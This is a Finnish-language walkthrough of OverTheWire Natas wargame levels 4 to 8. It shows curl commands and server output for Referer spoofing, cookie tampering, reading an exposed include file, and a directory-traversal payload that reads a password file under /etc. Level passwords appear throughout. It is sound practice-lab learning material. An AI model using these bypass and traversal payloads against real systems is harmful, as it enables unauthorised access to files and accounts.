natas harjoituksia level 5 to 11

https://overthewire.org/wargames/natas/

natas4 QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
muutama referensi ja http pyynt√∂ lunttilappu - START HERE;

yritett√§√§n selvitt√§√§ 4:sta kohti vitoseen (MALLI)
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org


-H ja --Headers ovat samoja komentoa, mutta molemmatkin k√§y ja riippuu k√§ytt√§j√§st√§ kumppaa k√§ytt√§√§ ett√§ helppottaakseen omaa komennon k√§ytt√∂√§
curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org 

curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org


curl "http://natas4.natas.labs.overthewire.org/" --compressed -H "Referer: http://natas5.natas.labs.overthewire.org/" -H "Authorization: Basic QryZXc2e0zahULdHrtHxzyYkj59kUxLQ"


curl ‚Äìuser natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ ‚Äìreferer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/

------------------------------------------------------------------------------------

LEVEL 5 - START HERE 
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --referer http://natas6.natas.labs.overthewire.org/ http://natas5.natas.labs.overthewire.org


curl -H "Referer: http://natas6.natas.labs.overthewire.org/" http://natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK@natas5.natas.labs.overthewire.org 


curl -Headers "Referer: http://natas6.natas.labs.overthewire.org/" http://natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK@natas5.natas.labs.overthewire.org 


-H tarkoittaa "headeri√§" (HTTP-otsikkoa) curl-komennossa
curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org/


curl "http://natas5.natas.labs.overthewire.org/" --compressed -H "Referer: http://natas6.natas.labs.overthewire.org/" -H "Authorization: Basic 0n35PkggAPm2zbEpOU802c0x0Msn1ToK"


level 5 cookies prosess;

$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt

‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                                                        
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        0
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                         
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        1


$ curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b "natas5_cookie.txt"



Komennolla curl voi hy√∂dynt√§√§ ev√§steit√§ (cookies) osana esimerkiksi white hat -penetraatiotestausta tai vaikkapa sivustojen autentikaation tutkimista.

üç™ Ev√§steiden k√§ytt√∂ curl-komennolla:
Ev√§steiden tallentaminen tiedostoon:


curl -c cookies.txt http://esimerkki.fi
T√§m√§ tallentaa palvelimen asettamat ev√§steet cookies.txt-tiedostoon Netscape-muodossa (standardi).

Ev√§steiden k√§ytt√§minen uudelleen:

curl -b cookies.txt http://esimerkki.fi/suojattu-sivu
T√§m√§ l√§hett√§√§ aiemmin tallennetut ev√§steet takaisin palvelimelle ‚Äì ik√§√§n kuin olisit jo kirjautunut tai k√§ynyt siell√§ aiemmin.

Yksitt√§isen ev√§steen l√§hett√§minen ilman tiedostoa:
curl -b "sessionid=abc123" http://esimerkki.fi


Miten t√§m√§ liittyy white hat -penetraatiotestaukseen?
Autentikoinnin kiert√§minen testaustarkoituksessa: Jos haluat tarkistaa, suojaako jokin sovellus ev√§steit√§ oikein, voit testata, pystyyk√∂ kirjautuneen k√§ytt√§j√§n ev√§steen avulla ohittamaan suojauksia.

Sessiohallinnan testaus: Voit tarkastella, kuinka palvelin k√§sittelee sessioita ja ev√§steit√§. Esimerkiksi, vanhentuuko ev√§ste? Voiko sit√§ uudelleenk√§ytt√§√§?

CSRF- ja XSS-testaus: Jos hy√∂kk√§yksen kautta saatu ev√§ste toimii toisen k√§ytt√§j√§n puolesta, voit testata, kuinka vakava ongelma on.


T√§rke√§ muistutus: Kaikkea t√§t√§ saa tehd√§ vain luvalla eli white hat -periaatteella. Ilman lupaa tehty penetraatiotestaus voi olla laitonta.



------------------------------------------------------------------------------------

# LEVEL 6 - START HERE; 

level 6 pass; 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```



**t√§m√§ on tarkistus HTTP-vastaus koodia** , ett√§ t√§m√§ ensimm√§isen√§;

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -I -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Fri, 02 May 2025 07:15:48 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "b75-6326d4351c6fc"
Accept-Ranges: bytes
Content-Length: 2933
Vary: Accept-Encoding
Content-Type: text/html
```

Jotenkin oikealla j√§ljill√§ ja sekalaista html koodia n√§ytt√§v√§ns√§ ja t√§ss√§ on mukana PHP-koodikielt√§, eli sama kuin selaimessa ja siksi toistumisessa n√§ytt√§√§ tosi sekavalta..

**OPTION2-komento** ja sama idea; `$curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org/index-source.html
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>
```

ainakin ylemm√§ss√§ sekalaisessa koodikieless√§ ainakin pist√§√§ ilmiins√§ on toi **"includes/secret.inc"** - sana. T√§m√§ on se just mik√§ meit√§ kiinnostaa nyt, ja meid√§n pit√§√§ selvitt√§√§ se ja mihin se voisii johtaa.

Ehk√§ osalle tai jonkun mielest√§ se voi johtaa seuraavaa polkua eli **`/index-source.html/includes/secret.inc`** , mutta ei, se on yksitt√§inen polku, ett√§ joudutaan kumota polku `/index-source.html`.

Eli ratkaisuksi menee n√§in:

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc 
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

```

T√§m√§ on se selainen koodi, jonka halutaan tiet√§√§ ja t√§t√§ pit√§√§ sijoittaa siihen formaatti kentt√§√§n, eli joudutaan palata siihen etusivulle. 


```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org                  
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```

Nyt jouduttaan k√§ytt√§√§ HTTP-protokollassa POST, PUT, DELETE ja muut vastaavat metodit ovat tapa suorittaa erilaisia toimintoja verkkosivujen ja API:iden kanssa. `curl` komentoa voi l√§hett√§√§ HTTP-pyynt√∂j√§, kuten POST ja PUT, suoraan komentorivilt√§, joten k√§ytett√§√§n t√§t√§ ja testataan.

HTML-lomakkeeseen curl-komennolla, koska sivu k√§ytt√§√§ POST-metodia lomakekenttien k√§sittelyyn.

nyt kokeillaan sijoittaa toi salainen koodi "FOEIUWGHFEEUHOFUOIU" vastaus tuohon **Input secret** kent√§√§n.

**T√ÑM√Ñ ON MALLI:**
*mit√§ t√§ss√§ oikein tapahtuu?* 

- -X POST m√§√§ritt√§√§, ett√§ k√§ytet√§√§n HTTP POST -pyynt√∂√§.

- -d "secret=LoremIpsum&submit=Submit" l√§hett√§√§ lomaketietona secret-kentt√§√§n arvon LoremIpsum ja painaa "submit"-painiketta.

- -H "Referer: ..." asettaa Referer-otsikon, joka voi olla tarpeellinen p√§√§syn varmistamiseksi.

- -u "natas6:..." lis√§√§ k√§ytt√§j√§tunnuksen ja salasanan autentikaatioon.

`$curl -X POST -d "secret=LoremIpsum&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`



Nyt n√§ytt√§√§ ainakin pelitt√§v√§n ja n√§in saattiin toi level 7:n salasansa 

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

--- 

LEVEL 7 - START HERE;

natas7 bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

- t√§m√§ voi olla itselleni yleisin k√§ytt√∂ `curl` - komento; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org`

- toisena ehk√§ t√§m√§ on parempi, mutta sama idea, ett√§ hakee headerins√§, ja sitten -u (ssh k√§yttiksen) `username:password`, ja sitten se URL polku `/index.html` ja jne; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


**samat tarkoittavat polu**, mutta menin vain mutkalla, mutta periaatteessa alemmat kolmet on samaa tarkoittavaa <br>
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=home
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=about"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

**seuraavaksi** testataan toi ohje/vinkki natas8 salasansa - START HERE;

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
<br />
<b>Warning</b>:  include(home/etc/natas_webpass/natas8): failed to open stream: No such file or directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'home/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

periaatteessa (ylemm√§ss√§) tuloksena, toi saman kuin kuvien perusteellakin, ett√§ kyseist√§ tiedostoa ja/tai tiedostonhakemistoa ei ole olemassa eli t√§m√§ polku `/var/www/natas/natas7/index.php` - niin se h√§m√§√§.


## Hakemistorakenteen manipulointi Natas7-haasteessa

Kun k√§sittelet tiedostopolkujen manipulointia, `"../"` tarkoittaa siirtymist√§ hakemistossa yl√∂sp√§in. Jos olet `/var/www/natas/natas7/index.php` -polussa ja haluat p√§√§st√§ k√§siksi tiedostoon `/etc/natas_webpass/natas8`, sinun t√§ytyy nousta hakemistorakenteessa riitt√§v√§n monta tasoa yl√∂sp√§in ja sitten navigoida oikeaan kohteeseen.


## Polun selitys
- `/var/www/natas/natas7/index.php` on alkuper√§inen sijainti.
- `../../../../../../etc/natas_webpass/natas8` tarkoittaa, ett√§ noustaan kuusi tasoa yl√∂sp√§in (pois `natas7`, `natas`, `www`, `var`, jne.), jotta saavutetaan juurihakemisto (`/etc`).
- n√§in ollen siirryt√§√§n `natas_webpass/natas8`, eli polku ohjaa tiedostoon, jossa on siksi mahdollisesti on taso 8 salasansa.

## Miksi t√§m√§ toimii?
- Jos palvelin ei ole suojattu **directory traversal** -hy√∂kk√§yksilt√§, se sallii polkumuutokset ja antaa p√§√§syn tiedostoihin hakemistorakenteen ulkopuolella.
- T√§m√§ on mahdollista, koska **index.php** k√§ytt√§√§ `GET`-parametria (`page`), joka voi k√§sitell√§ manipulointia ilman tarkastuksia.
- Hakkerointiteknisesti t√§m√§ opettaa, miksi hakemiston p√§√§syn rajoittaminen on t√§rke√§√§.
- N√§in ollen t√§m√§ tarkoittaa palvelin sallii navigoinnin syvemm√§lle tiedostoj√§rjestelm√§√§n.

## Perustelut ja oppimispisteet
T√§m√§ haaste auttaa ymm√§rt√§m√§√§n hakemistorakenteiden hy√∂dynt√§mist√§ palvelimilla sek√§ sen, miksi polkumuutosten validointi on kriittist√§ turvallisuuden kannalta. üõ°Ô∏è

---

## kali linux - version START HERE; CONTINUE

AIKAISEMPI TESTI;
`$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home/var/www/natas/natas7/index.php/etc/natas_webpass/natas8" `



T√§m√§ alempi on se toimiva, mutta ylemm√§ss√§ kummottiin toi "=home" asti, ett√§ siihen tulee "../"

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

en tied√§ miksi menin mutkan kautta, mutta t√§m√§kin onnistui, mutta kulkematta -Headerin referenssi√§ ja siit√§ sy√∂tt√§en kohti natas7 levelin ja sen salasansa, sitten vihjeen mukaan se `/etc/natas_webpass/natas8` - hakemiston polun kautta. T√§ss√§ vain menty joko "home" tai "about" sivuston alle, ja urlista kummoaa ne parametrit (home | aboout), ett√§ sijoittaa per√§n sen hakemistonsa.

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

# level 8 - START HERE;

natas8 xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q



<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

Etusivussa on view sourcecode, joka viee t√§nne sivustolle eli `index-source.html` . Niin siin√§ on koodattu yksi pieni osa PHP-koodi, jossa on salainen salausmenetelm√§ koodip√§tk√§, jonka pit√§isi saada enkoodattuksi. Enkoodaus tarkoittaa "encode" siis enkoodattu joku salainen koodi jonka halutaan purkkaa takaisin sanaksi. Muutamia enkoodaus tyyppej√§ mm. base64, URL-enkoodaus, Hex ja jne.

üîπ Enkoodaus (encode) ‚Üí Muuntaa tiedon toiseen muotoon, esimerkiksi Base64- tai heksadesimaaliseen muotoon. üîπ Dekoodaus (decode) ‚Üí Palauttaa enkoodatun tiedon takaisin alkuper√§iseen muotoonsa.

